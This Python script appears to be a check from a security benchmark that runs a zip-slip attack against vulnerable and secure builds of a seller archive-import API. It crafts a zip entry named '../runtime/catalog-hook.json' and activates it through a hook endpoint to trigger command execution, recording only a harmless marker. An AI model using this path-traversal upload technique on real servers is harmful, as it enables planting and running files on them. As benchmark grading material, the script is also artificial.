from __future__ import annotations

import hashlib
import io
import json
import zipfile
from pathlib import Path
from uuid import uuid4

import httpx

from check_stage3a_support_role_csrf_pair import (
    EVENT_SCHEMA_PATH,
    PUBLIC_ORIGIN,
    bearer,
    canonical_json,
    compose_exec,
    configure_api,
    digest,
    digest_bytes,
    login,
    reset,
    running_image_digest,
)


SELLER_ID = "00000000-0000-4000-8000-000000000002"
# The application no longer matches a published marker constant. It records
# the digest of whatever hook document reached the operations runtime
# directory through the seller import path.
HOOK_DOCUMENT = canonical_json(
    {"action": "write_marker", "note": "catalog refresh"}
).encode()
# 앱이 사건 본문과 실행 흔적 파일에 적는 값이다.
MARKER_SHA256 = hashlib.sha256(HOOK_DOCUMENT).hexdigest()
# marker_state() 는 흔적 파일의 내용을 다시 요약해 돌려준다. 그 파일이 담는
# 것은 위의 요약값 문자열이므로 기대값은 그것을 한 번 더 요약한 값이다.
EXECUTED_MARKER_SHA256 = hashlib.sha256(MARKER_SHA256.encode()).hexdigest()


def archive(member_name: str, content: bytes) -> bytes:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as bundle:
        bundle.writestr(member_name, content)
    return output.getvalue()


def marker_state() -> dict[str, object]:
    code = (
        "import hashlib,json,pathlib;"
        "p=pathlib.Path('/app/benchmark-files/runtime/catalog-hook.json.executed');"
        "b=p.read_bytes() if p.is_file() else None;"
        "print(json.dumps({'exists':b is not None,'sha256':hashlib.sha256(b).hexdigest() if b else None},sort_keys=True))"
    )
    return json.loads(compose_exec("api", code))


def verifier() -> tuple[str, dict[str, object]]:
    scenario_id = "multi-stage-archive-upload-path-execution"
    predicate_id = scenario_id + ".effect"
    subject = {"actor_id": SELLER_ID, "authorized": "false", "role": "seller_staff"}
    object_ = {
        "resource_id": "runtime/catalog-hook.json",
        "marker_sha256": MARKER_SHA256,
    }
    deduplication_key = f"archive-hook:{SELLER_ID}:{MARKER_SHA256}"
    condition = {
        "deduplication_key": deduplication_key,
        "event_type": "command.executed",
        "minimum_occurrences": 1,
        "object": object_,
        "protected_resource_key": "archive.controlled-execution-marker",
        "subject": subject,
        "window_seconds": 300,
    }
    return predicate_id, {
        "contract_version": 1,
        "scenario_id": scenario_id,
        "verifier_image_digest": running_image_digest("evaluator"),
        "event_schema_digest": digest_bytes(EVENT_SCHEMA_PATH.read_bytes()),
        "network_access": "control-only",
        "attacker_visible": False,
        "predicates": [{
            "predicate_id": predicate_id,
            "effect_type": "controlled-command-execution",
            "event_type": "command.executed",
            "subject_selector": canonical_json(subject),
            "object_selector": canonical_json(object_),
            "protected_resource_key": "archive.controlled-execution-marker",
            "condition_digest": digest(condition),
            "window_seconds": 300,
            "minimum_occurrences": 1,
            "deduplication_key": deduplication_key,
        }],
    }


def evaluate(trial_id: str, predicate_id: str, manifest: dict[str, object]) -> dict[str, object]:
    payload = canonical_json({"trial_id": trial_id, "predicate_id": predicate_id, "verifier": manifest})
    code = (
        "import os,sys,urllib.request;"
        "r=urllib.request.Request('http://127.0.0.1:8000/internal/evaluate',"
        "data=sys.argv[1].encode(),headers={'Content-Type':'application/json',"
        "'X-Ruby-Evaluator-Token':os.environ['RUBY_EVALUATOR_TOKEN']});"
        "print(urllib.request.urlopen(r).read().decode())"
    )
    return json.loads(compose_exec("evaluator", code, payload))


def run_condition(vulnerable: bool) -> dict[str, object]:
    module = "multi-stage.archive-upload-path-execution"
    trial_id = uuid4().hex
    configure_api(trial_id=trial_id, module_id=module if vulnerable else None)
    reset()
    normal_zip = archive("catalog/description.txt", b"controlled catalog description")
    attack_zip = archive(
        "../runtime/catalog-hook.json",
        HOOK_DOCUMENT,
    )
    with httpx.Client(base_url=PUBLIC_ORIGIN, timeout=20) as client:
        seller_token, seller_id = login(client, "seller@ruby.local")
        headers = bearer(seller_token)
        normal = client.post(
            "/api/seller/archive-imports",
            headers=headers,
            files={"archive": ("normal.zip", normal_zip, "application/zip")},
        )
        imported = client.post(
            "/api/seller/archive-imports",
            headers=headers,
            files={"archive": ("catalog.zip", attack_zip, "application/zip")},
        )
        activated = client.post(
            "/api/seller/archive-hooks/activate",
            headers=headers,
            json={"hook_path": "../runtime/catalog-hook.json"},
        )
    if seller_id != SELLER_ID:
        raise RuntimeError("seed seller identifier changed")
    state = marker_state()
    predicate_id, manifest = verifier()
    evaluation = evaluate(trial_id, predicate_id, manifest)
    expected_import = 201 if vulnerable else 422
    expected_activation = 200 if vulnerable else 404
    checks = {
        "normal_archive_succeeded": normal.status_code == 201,
        "normal_archive_path_is_confined": normal.status_code == 201
        and normal.json().get("extracted_files") == ["archive-imports/catalog/description.txt"],
        "attack_import_matches_condition": imported.status_code == expected_import,
        "activation_matches_condition": activated.status_code == expected_activation,
        "marker_matches_condition": state == {
            "exists": vulnerable,
            "sha256": EXECUTED_MARKER_SHA256 if vulnerable else None,
        },
        "private_evaluator_matches_condition": evaluation["objective_achieved"] is vulnerable,
        "event_count_matches_condition": len(evaluation["matched_event_ids"]) == (1 if vulnerable else 0),
    }
    return {
        "scenario_id": "archive-upload-path-execution",
        "module_id": module,
        "condition": "vulnerable" if vulnerable else "secure",
        "trial_id": trial_id,
        "normal_import_http_status": normal.status_code,
        "attack_import_http_status": imported.status_code,
        "activation_http_status": activated.status_code,
        "marker_state": state,
        "evaluation": evaluation,
        "checks": checks,
        "passed": all(checks.values()),
    }


def main() -> int:
    parser = __import__("argparse").ArgumentParser()
    parser.add_argument("--output-dir", type=Path, required=True)
    args = parser.parse_args()
    if args.output_dir.exists():
        raise FileExistsError(f"refusing to overwrite output directory: {args.output_dir}")
    args.output_dir.mkdir(parents=True)
    report: dict[str, object]
    restored = False
    try:
        results = [run_condition(False), run_condition(True)]
        report = {
            "report_version": 1,
            "scenario_id": "archive-upload-path-execution",
            "module_id": "multi-stage.archive-upload-path-execution",
            "results": results,
            "passed": all(item["passed"] for item in results),
        }
    finally:
        configure_api(trial_id=None, module_id=None)
        reset()
        restored = marker_state() == {"exists": False, "sha256": None}
    report["final_state_restored"] = restored
    report["passed"] = bool(report["passed"] and restored)
    report_path = args.output_dir / "stage3a-archive-execution-pair-report.json"
    report_path.write_text(
        json.dumps(report, ensure_ascii=False, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    print(json.dumps({"report": str(report_path), "passed": report["passed"]}, sort_keys=True))
    return 0 if report["passed"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
